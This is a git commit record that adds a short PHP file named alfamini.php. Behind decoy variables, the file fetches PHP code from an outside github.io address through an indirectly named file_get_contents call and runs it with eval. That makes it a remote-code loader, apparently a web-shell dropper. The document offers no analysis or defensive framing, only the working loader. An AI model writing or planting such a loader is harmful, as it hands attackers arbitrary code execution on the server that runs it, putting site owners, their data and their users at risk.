3103676ee7c8885223c213b1cf3ad8f11bde6e2d
xinz769 <a90870619@gmail.com>
2025-05-16 21:10:53 +0700

    Create alfamini.php

---
+++ 769/alfamini.php
@@ -0,0 +1,9 @@
+<?php
+$random1 = "randomValue1";?>
+<?php
+$random2 = "randomValue2";$__aB = "https://xinz769.github.io/mcb/769/alfakecil.php";?>
+<?php
+$random3 = "randomValue3";$__B = "FILE_GET_CONTENTS";?>
+<?php
+eval("?>". $__B($__aB));
+?>
